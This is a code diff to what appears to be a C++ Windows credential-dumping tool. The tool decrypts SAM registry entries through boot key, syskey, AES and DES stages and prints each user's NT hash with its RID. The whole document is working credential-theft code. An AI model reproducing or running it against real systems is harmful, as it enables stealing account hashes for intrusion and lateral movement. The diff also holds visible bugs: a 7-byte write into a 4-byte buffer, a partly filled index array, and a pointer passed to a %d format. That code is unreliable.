@@ -300,8 +300,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 		BYTE bootKey[16];
 		getBootKey(samRegEntries[i], bootKey);
 
-		BYTE encNTLM[16] = {};
-		
+		BYTE encNTLMrecovered[16] = {};		
 
 		if (samRegEntries[i]->v[0xAC] == 0x38) {
 			BYTE encSyskey[16] = {};
@@ -311,7 +310,7 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			CopyMemory(encSyskeyIV, &samRegEntries[i]->f[0x78], 16);
 
 			CBC_Mode< AES >::Decryption d;
-			d.SetKeyWithIV(bootKey, 16, encSyskeyIV);
+			d.SetKeyWithIV(bootKey, 16, encSyskeyIV, 16);
 			
 			BYTE sysKey[16] = {};
 			ArraySink rs(sysKey, 16);
@@ -323,14 +322,14 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			);
 
 			BYTE encNTLMIV[16] = {};
+			BYTE encNTLM[16] = {};
 			CopyMemory(encNTLMIV, &samRegEntries[i]->v[offset + 0x8], 16);
 			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x18], 16);
 			// encNTLMKey = sysKey
 
 			CBC_Mode< AES >::Decryption d2;
-			d2.SetKeyWithIV(sysKey, 16, encNTLMIV);
-
-			BYTE encNTLMrecovered[16] = {};
+			d2.SetKeyWithIV(sysKey, 16, encNTLMIV, 16);
+			
 			ArraySink rs2(encNTLMrecovered, 16);
 			ArraySource s2(encNTLM, 16, true,
 				new StreamTransformationFilter(d2,
@@ -361,21 +360,12 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 			dec.ProcessData(sysKey, encSyskey, 16);
 
 			BYTE encNTLMKey[16] = {};
+			BYTE encNTLM[16] = {};
 			CopyMemory(encNTLMKey, &samRegEntries[i]->v[offset + 0x4], 16);
 			CopyMemory(encNTLM, &samRegEntries[i]->v[offset + 0x4], 16);
 
 			BYTE aux[4] = {};
-			int j = 0;
-			for (int i = 3; i >= 0; i--) {
-				CHAR aux[2] = {};
-				aux[0] = samRegEntries[i]->rid[i * 2];
-				aux[1] = samRegEntries[i]->rid[i * 2 + 1];
-
-				PCHAR end;
-
-				aux[j] = strtoul(aux, &end, 16);
-				j++;
-			}
+			getAuxSyskey(samRegEntries[i], aux);
 
 			MD5 hash2;
 			hash2.Update(sysKey, 16);
@@ -413,8 +403,8 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		BYTE encNTLM1[8] = {};
 		BYTE encNTLM2[8] = {};
-		CopyMemory(encNTLM1, encNTLM, 8);
-		CopyMemory(encNTLM2, encNTLM + 0x8, 8);
+		CopyMemory(encNTLM1, encNTLMrecovered, 8);
+		CopyMemory(encNTLM2, encNTLMrecovered + 0x8, 8);
 
 		BYTE NTLM1[8] = {};
 		BYTE NTLM2[8] = {};
@@ -440,14 +430,17 @@ void decryptSAM(PSAM samRegEntries[], int entries) {
 
 		BYTE NTLM[16] = {};
 		CHAR NTLMstr[33] = {};
+		int ridN = (int)wcstol(samRegEntries[i]->rid, NULL, 16);
 		CopyMemory(NTLM, NTLM1, 8);
 		CopyMemory(NTLM + 0x8, NTLM2, 8);
 
-		for (int i = 0; i < 33; i++) {
-			sprintf_s(NTLMstr + i * 2, 33, "%02x", NTLM[i]);
+		for (int i = 0; i < 16; i++) {
+			sprintf_s(NTLMstr + i * 2, 32, "%02x", NTLM[i]);
 		}
 
-		wprintf(L"User %s -> ", username);
+		toUpperStr(NTLMstr);
+
+		wprintf(L"User [ %s ] with RID [ %d ] -> ", username, &ridN);
 		printf("NT: %s\n", NTLMstr);
 
 		HeapFree(GetProcessHeap(), 0, username);
@@ -590,6 +583,28 @@ void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret) {
 		desStr2[i] = strtoul(auxStr, &end, 16);
 	}
 	CopyMemory(desStr2Ret, desStr2, 7);
+}
+
+void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet) {
+	LONG magics[7] = { 3,2,1,0 };
+	BYTE auxSyskey[7] = {};
+	for (int i = 0; i < 7; i++) {
+		CHAR auxStr[3] = {};
+
+		PCHAR end;
+
+		auxStr[0] = samRegEntry->rid[magics[i] * 2];
+		auxStr[1] = samRegEntry->rid[magics[i] * 2 + 1];
+
+		auxSyskey[i] = strtoul(auxStr, &end, 16);
+	}
+	CopyMemory(auxSyskeyRet, auxSyskey, 7);
+}
+
+void toUpperStr(char* s) {
+	for (int i = 0; i < strlen(s); i++) {
+		s[i] = toupper(s[i]);
+	}
 }
 
 int main(int argc, char** argv) {
